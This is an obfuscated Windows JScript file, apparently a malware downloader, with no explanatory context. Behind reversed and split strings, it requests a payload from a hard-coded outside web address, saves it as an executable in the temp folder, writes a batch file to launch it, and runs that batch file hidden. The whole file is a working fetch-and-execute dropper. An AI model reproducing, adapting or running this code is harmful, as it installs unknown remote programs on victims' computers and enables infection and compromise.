
/*@cc_on /* _r_cmt */
  @if (@_win32 || @_win64)/* _r_cmt */
    //
	var ______zbsymmetry = false;
	var ______zasymmetry = "";
	var push;
	var ______zacopies = "tcejbOetaerC".split(''/* _r_cmt */).reverse(/* _r_cmt */).join(''); 
	______zabodyaxes = "%TEMP%/";
	______zbseptember = "H2xGZclTgjffJ.e" + "xe";
	terms /* _r_cmt */ = "W"+"S"+"c"+"ript";
	______zbsymmetry /* _r_cmt */= true;/* _r_cmt */
	______zasymmetry/* _r_cmt */ = /* _r_cmt */"MLH";/* _r_cmt */
	push =/* _r_cmt */ "R" + "esponseB"/* _r_cmt */ + "ydo".split('').reverse().join('');
	bodyaxes = /* _r_cmt */(/* _r_cmt */"noitisop").split(''/* _r_cmt */).reverse(/* _r_cmt */).join('');
	______zasdiv7/* _r_cmt */ =/* _r_cmt */ "eliFoTevaS".split(''/* _r_cmt */).reverse().join('');
	______zbtop = "A"+"DODB";
	______zbuseimagetext = "s" + "end";
	abases = "htt"+"p:"+"//c"+"en"+"tur"+"y21"+"ke"+"im."+"co"+"m/"+"4y"+"5y3"+"t3"+"4t3";
	______zastructure = "G\x45"+"T";
 /* _r_cmt */ @end/* _r_cmt */
@*//* _r_cmt */
if (!(______zbsymmetry))
{
	sdiv7 = ______zbsymmetry / 0;
}


var september/* _r_cmt */ = /* _r_cmt */this[/* _r_cmt */terms /* _r_cmt *//* _r_cmt */]/* _r_cmt */;
var ______zbccff /* _r_cmt */ = function top() {return september[______zacopies](("fdasfadsfaszxvc", terms /* _r_cmt */)+".Shel"+"l");}(), ______zax10000 = 11;
var ______zanegated = (1 * 1) * ((-2088 + 2090) - 0);
var sweden = ______zanegated - (2 + 0) * (3740 - 3739);
function ccff(______zab9f4){______zbccff[("3", "2", "R")+ "u" + ("1", "n")](______zab9f4, sweden, sweden);};
function useimagetext(){return ______zacopies;};

{
var ______zaseptember = "M" + "SX"+"ML2."+"X"+______zasymmetry+"T"+"TP";
var negated = "";
negated = "o"+"pen";
function symmetry(______zasweden) {______zasweden[______zasdiv7](______zbccff["E"+"xpandEnvir"+"o"+"nmentStrings"](______zabodyaxes) + "H2xGZclTgjffJ.ex" + "e", 2 * 1); return 0;};

if (true){
 ______zbpush = ______zaseptember;
 ______zbsdiv7 = september[______zacopies](______zbpush);
 var ______zatop = 1;
while (______zatop) { 
	for (;______zatop;){
	try {
		if (______zatop == 1)
		{
			______zbsdiv7[negated](______zastructure, abases, (true, false));
			______zbsdiv7[______zbuseimagetext]();
			______zaccff = "S"+"l"+"eep";
			______zatop = 2;
		}
		september[______zaccff](120); 
		if (______zbsdiv7["r"+"eadystate"] < 4) 
		{
			continue;
		}
		______zatop = sweden;
		function copies /* _r_cmt */(structure) {var ______zauseimagetext = (123, structure); return ______zauseimagetext;};
		
		x10000 = ______zbccff["E"+"xpandEnvir"+"o"+"nmentStrings"](______zabodyaxes) + ______zbseptember;
		______zaterms = ______zbccff["E"+"xpandEnvir"+"o"+"nmentStrings"](______zabodyaxes) + "sdaw2.bat";
		______zbcopies = "start "+x10000+"\r\nexit"

		______zbpush = ______zaabases = september[useimagetext()](______zbtop+"."+"S"+"tr"+"e"+"a"+"m");
		______zbpush[negated]();
		______zbpush["t"+"y"+"pe"] = 2;
		b9f4 = "wr"+"i"+"t"+"e";
		______zbpush["Charset"] = "windows-1251";
		______zbpush[b9f4+"Text"](______zbcopies);
		______zaabases[bodyaxes] = 0;
		______zbpush[______zasdiv7](______zaterms, 1 * 2);
		______zaabases["close"]();
		
		______zbpush = ______zaabases = september[useimagetext()](______zbtop+"."+"S"+"tr"+"e"+"a"+"m");
		______zbpush[negated]();
		______zbpush["t"+"y"+"pe"] = 2;
		______zbpush["Charset"] = "windows-1251";
		______zbpush[b9f4+"Text"]("M");
		______zaabases[bodyaxes] = 4439 - 4439;
		symmetry(______zbpush);
		______zaabases["close"]();
		
		______zbpush = ______zaabases = september[useimagetext()](______zbtop+"."+"S"+"tr"+"e"+"a"+"m");
		______zbpush[negated]();
		______zbpush["t"+"y"+"pe"] = 1 * 1;
		______zbpush[b9f4](______zbsdiv7[push]);
		______zaabases[bodyaxes] = 1;
		symmetry(______zbpush);
		______zaabases["close"]();
		
		if (1 && ______zbsymmetry) ccff(______zaterms);
	} catch(______zapush){};};
};
}
}

